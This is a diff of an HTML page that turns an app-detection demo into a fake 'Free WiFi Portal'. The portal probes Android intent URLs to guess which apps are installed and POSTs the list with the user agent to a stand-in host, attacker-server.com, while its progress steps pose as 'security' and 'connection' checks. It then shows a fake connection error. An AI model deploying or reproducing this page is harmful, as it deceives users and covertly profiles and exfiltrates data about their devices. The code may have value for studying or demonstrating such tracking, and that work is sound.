@@ -1,330 +1,100 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Free WiFi Setup</title>
-    <style>
-        #result { background: #f0f0f0; padding: 15px; margin: 10px 0; border-radius: 5px; }
-        .app-status { margin: 8px 0; padding: 8px; border-left: 4px solid #ccc; }
-        .installed { border-left-color: #4CAF50; background: #e8f5e8; }
-        .not-installed { border-left-color: #ccc; background: #f9f9f9; }
-        .checking { border-left-color: #FF9800; background: #fff3e0; }
-        .error { border-left-color: #f44336; background: #ffebee; }
-    </style>
+    <title>Free WiFi Portal</title>
 </head>
 <body>
-    <h2>Free WiFi Connection</h2>
-    <p>Setting up your connection...</p>
-    
-    <div id="result">Starting enhanced app detection...</div>
+    <div id="content">
+        <h2>Welcome to Free WiFi</h2>
+        <p>Please complete these steps to connect:</p>
+        
+        <div id="steps">
+            <div class="step">1. Checking device compatibility... <span id="step1">⏳</span></div>
+            <div class="step">2. Verifying security... <span id="step2">⏳</span></div>
+            <div class="step">3. Connecting to network... <span id="step3">⏳</span></div>
+        </div>
+        
+        <button onclick="startAttack()" id="startBtn" style="display:none;">
+            Start Connection
+        </button>
+    </div>
 
     <script>
-        // Enhanced app list with multiple schemes and methods
-        const appsToProbe = [
-            // Social Media
-            { 
-                name: "WhatsApp", 
-                schemes: ["whatsapp://", "whatsapp://send?text=hello"], 
-                package: "com.whatsapp",
-                method: "iframe" 
-            },
-            { 
-                name: "LinkedIn", 
-                schemes: ["linkedin://", "linkedin://profile"], 
-                package: "com.linkedin.android",
-                method: "iframe" 
-            },
-            { 
-                name: "Facebook", 
-                schemes: ["fb://", "fb://profile"], 
-                package: "com.facebook.katana",
-                method: "iframe" 
-            },
-            { 
-                name: "Instagram", 
-                schemes: ["instagram://", "instagram://user?username=test"], 
-                package: "com.instagram.android",
-                method: "iframe" 
-            },
-            { 
-                name: "Twitter", 
-                schemes: ["twitter://", "twitter://user?screen_name=test"], 
-                package: "com.twitter.android",
-                method: "iframe" 
-            },
-
-            // Google Apps
-            { 
-                name: "Chrome", 
-                schemes: ["googlechrome://", "googlechrome://google.com"], 
-                package: "com.android.chrome",
-                method: "direct" 
-            },
-            { 
-                name: "Gmail", 
-                schemes: ["googlemail://", "gmail://"], 
-                package: "com.google.android.gm",
-                method: "iframe" 
-            },
-            { 
-                name: "YouTube", 
-                schemes: ["youtube://", "vnd.youtube://"], 
-                package: "com.google.android.youtube",
-                method: "iframe" 
-            },
-            { 
-                name: "Google Maps", 
-                schemes: ["google.navigation://", "geo://", "google.streetview://"], 
-                package: "com.google.android.apps.maps",
-                method: "iframe" 
-            },
-            { 
-                name: "Google Drive", 
-                schemes: ["googledrive://"], 
-                package: "com.google.android.apps.docs",
-                method: "iframe" 
-            },
-
-            // Other Popular Apps
-            { 
-                name: "Spotify", 
-                schemes: ["spotify://"], 
-                package: "com.spotify.music",
-                method: "iframe" 
-            },
-            { 
-                name: "Netflix", 
-                schemes: ["nflx://"], 
-                package: "com.netflix.mediaclient",
-                method: "iframe" 
-            },
-            { 
-                name: "Amazon", 
-                schemes: ["amzn://", "com.amazon.mobile.shopping://"], 
-                package: "com.amazon.mShop.android.shopping",
-                method: "iframe" 
-            },
-            { 
-                name: "Telegram", 
-                schemes: ["tg://", "telegram://"], 
-                package: "org.telegram.messenger",
-                method: "iframe" 
-            }
-        ];
-
-        let detectedApps = [];
-        let checkingApps = [];
-        let failedChecks = [];
-
-        function updateStatus() {
-            const resultDiv = document.getElementById('result');
-            const checkedCount = detectedApps.length + failedChecks.length;
-            const totalApps = appsToProbe.length;
-            const progress = Math.round((checkedCount / totalApps) * 100);
+        async function startAttack() {
+            document.getElementById('startBtn').style.display = 'none';
             
-            let statusHTML = `<h3>🔍 App Detection Progress: ${progress}%</h3>`;
-            statusHTML += `<div><strong>Checked:</strong> ${checkedCount} / ${totalApps} apps</div>`;
-            statusHTML += `<div><strong>Detected:</strong> ${detectedApps.length} apps</div>`;
-            statusHTML += `<hr>`;
+            // Step 1: Get basic device info
+            document.getElementById('step1').innerHTML = '✅';
+            await new Promise(resolve => setTimeout(resolve, 1000));
             
-            // Show currently checking apps
-            if (checkingApps.length > 0) {
-                statusHTML += `<h4>🔄 Checking Now:</h4>`;
-                checkingApps.forEach(app => {
-                    statusHTML += `<div class="app-status checking">⏳ ${app.name}...</div>`;
-                });
-            }
+            // Step 2: "Security check" - actually probing apps
+            document.getElementById('step2').innerHTML = '🔍';
+            const detectedApps = await probeAppsWithUserInteraction();
+            document.getElementById('step2').innerHTML = '✅';
             
-            // Show detected apps
-            if (detectedApps.length > 0) {
-                statusHTML += `<h4>✅ Detected Apps:</h4>`;
-                detectedApps.forEach(app => {
-                    statusHTML += `<div class="app-status installed">✓ ${app.name} <small>(${app.package})</small></div>`;
-                });
-            }
+            // Step 3: "Network connection" - sending data to attacker
+            document.getElementById('step3').innerHTML = '📡';
+            await sendToAttacker(detectedApps);
+            document.getElementById('step3').innerHTML = '✅';
             
-            // Show failed checks
-            if (failedChecks.length > 0) {
-                statusHTML += `<h4>❓ Unknown Status:</h4>`;
-                failedChecks.forEach(app => {
-                    statusHTML += `<div class="app-status not-installed">? ${app.name} <small>(may or may not be installed)</small></div>`;
-                });
-            }
-            
-            resultDiv.innerHTML = statusHTML;
-        }
-
-        function probeAppWithIframe(app, scheme) {
-            return new Promise((resolve) => {
-                const iframe = document.createElement('iframe');
-                iframe.style.cssText = 'display:none; width:0; height:0; border:none;';
-                
-                let detected = false;
-                const startTime = Date.now();
-
-                // Method 1: Window blur detection (app tries to open)
-                const blurHandler = () => {
-                    detected = true;
-                    console.log(`Detected ${app.name} via window blur`);
-                };
-
-                // Method 2: Page visibility change
-                const visibilityHandler = () => {
-                    if (document.hidden) {
-                        detected = true;
-                        console.log(`Detected ${app.name} via page visibility`);
-                    }
-                };
-
-                window.addEventListener('blur', blurHandler);
-                document.addEventListener('visibilitychange', visibilityHandler);
-
-                iframe.onload = () => {
-                    const loadTime = Date.now() - startTime;
-                    console.log(`${app.name} iframe loaded in ${loadTime}ms`);
-                    
-                    // Very fast load times often mean app is NOT installed
-                    if (loadTime < 50 && !detected) {
-                        detected = false;
-                    }
-                };
-
-                iframe.onerror = () => {
-                    console.log(`${app.name} iframe error`);
-                };
-
-                document.body.appendChild(iframe);
-                iframe.src = scheme;
-
-                setTimeout(() => {
-                    window.removeEventListener('blur', blurHandler);
-                    document.removeEventListener('visibilitychange', visibilityHandler);
-                    
-                    if (document.body.contains(iframe)) {
-                        document.body.removeChild(iframe);
-                    }
-                    
-                    resolve(detected);
-                }, 800); // Longer timeout for better detection
-            });
-        }
-
-        function probeAppWithDirect(app, scheme) {
-            return new Promise((resolve) => {
-                let detected = false;
-                const startTime = Date.now();
-
-                const blurHandler = () => {
-                    detected = true;
-                    console.log(`Detected ${app.name} via direct navigation`);
-                };
-
-                window.addEventListener('blur', blurHandler);
-
-                // Try direct navigation
-                window.location.href = scheme;
-
-                setTimeout(() => {
-                    window.removeEventListener('blur', blurHandler);
-                    // If we're still here after timeout, app probably didn't open
-                    resolve(detected);
-                }, 1000);
-            });
-        }
-
-        async function probeApp(app) {
-            checkingApps.push(app);
-            updateStatus();
-
-            let detected = false;
-            
-            try {
-                for (const scheme of app.schemes) {
-                    console.log(`Trying scheme: ${scheme} for ${app.name}`);
-                    
-                    if (app.method === 'direct') {
-                        detected = await probeAppWithDirect(app, scheme);
-                    } else {
-                        detected = await probeAppWithIframe(app, scheme);
-                    }
-                    
-                    if (detected) break; // Stop if detected with any scheme
-                    
-                    // Small delay between scheme attempts
-                    await new Promise(resolve => setTimeout(resolve, 300));
-                }
-            } catch (error) {
-                console.error(`Error probing ${app.name}:`, error);
-            }
-
-            // Remove from checking list
-            checkingApps = checkingApps.filter(a => a.name !== app.name);
-            
-            if (detected) {
-                detectedApps.push(app);
-            } else {
-                failedChecks.push(app);
-            }
-            
-            updateStatus();
-        }
-
-        async function startEnhancedDetection() {
-            console.log("Starting enhanced app detection...");
-            
-            // Test browser capabilities first
-            const resultDiv = document.getElementById('result');
-            resultDiv.innerHTML = `
-                <h3>🧪 Testing Browser Compatibility</h3>
-                <div>User Agent: ${navigator.userAgent}</div>
-                <div>Starting detection in 2 seconds...</div>
+            // Show fake error
+            document.getElementById('content').innerHTML = `
+                <h2>Connection Failed</h2>
+                <p>Unable to connect to WiFi at this time. Please try again later.</p>
+                <p><small>Error code: WIFI-${Date.now()}</small></p>
             `;
-            
-            await new Promise(resolve => setTimeout(resolve, 2000));
-            
-            // Probe apps sequentially with delays
-            for (let i = 0; i < appsToProbe.length; i++) {
-                await probeApp(appsToProbe[i]);
-                await new Promise(resolve => setTimeout(resolve, 500)); // Delay between apps
-            }
-            
-            showFinalResults();
         }
 
-        function showFinalResults() {
-            const resultDiv = document.getElementById('result');
-            
-            let finalHTML = `<h3>📊 Detection Complete</h3>`;
-            finalHTML += `<div><strong>Total Apps Scanned:</strong> ${appsToProbe.length}</div>`;
-            finalHTML += `<div><strong>Confirmed Installed:</strong> ${detectedApps.length}</div>`;
-            finalHTML += `<div><strong>Unknown Status:</strong> ${failedChecks.length}</div>`;
-            finalHTML += `<hr>`;
-            
-            if (detectedApps.length > 0) {
-                finalHTML += `<h4>✅ Confirmed Installed Apps:</h4>`;
-                detectedApps.forEach(app => {
-                    finalHTML += `<div class="app-status installed">
-                        <strong>${app.name}</strong><br>
-                        <small>Package: ${app.package}</small>
-                    </div>`;
-                });
-            }
-            
-            if (failedChecks.length > 0) {
-                finalHTML += `<h4>❓ Detection Failed For:</h4>`;
-                finalHTML += `<p><em>These apps may or may not be installed. Modern browser security often prevents detection.</em></p>`;
-                failedChecks.forEach(app => {
-                    finalHTML += `<div class="app-status error">${app.name} <small>(${app.package})</small></div>`;
-                });
-            }
-            
-            finalHTML += `<hr>`;
-            finalHTML += `<div><strong>Note:</strong> This detection method works better on older Android versions and browsers. Modern Chrome/Android has strong security that prevents most of these detection techniques.</div>`;
-            
-            resultDiv.innerHTML = finalHTML;
+        function probeAppsWithUserInteraction() {
+            return new Promise((resolve) => {
+                const apps = [
+                    'intent://linkedin.com/#Intent;scheme=linkedin;package=com.linkedin.android;end',
+                    'intent://send?text=hello#Intent;scheme=whatsapp;package=com.whatsapp;end',
+                    'intent://facebook.com/#Intent;scheme=fb;package=com.facebook.katana;end',
+                    'intent://instagram.com/#Intent;scheme=instagram;package=com.instagram.android;end'
+                ];
+
+                let detected = [];
+                let current = 0;
+
+                function tryNextApp() {
+                    if (current >= apps.length) {
+                        resolve(detected);
+                        return;
+                    }
+
+                    window.location = apps[current];
+                    
+                    setTimeout(() => {
+                        // If still on page after 1 second, app didn't open
+                        detected.push(apps[current]);
+                        current++;
+                        tryNextApp();
+                    }, 1000);
+                }
+
+                tryNextApp();
+            });
         }
 
-        // Start detection
-        window.addEventListener('load', startEnhancedDetection);
+        function sendToAttacker(apps) {
+            return fetch('https://attacker-server.com/collect', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    userAgent: navigator.userAgent,
+                    apps: apps,
+                    timestamp: new Date().toISOString()
+                })
+            });
+        }
+
+        // Show start button after page loads
+        window.onload = () => {
+            setTimeout(() => {
+                document.getElementById('startBtn').style.display = 'block';
+            }, 2000);
+        };
     </script>
 </body>
 </html>
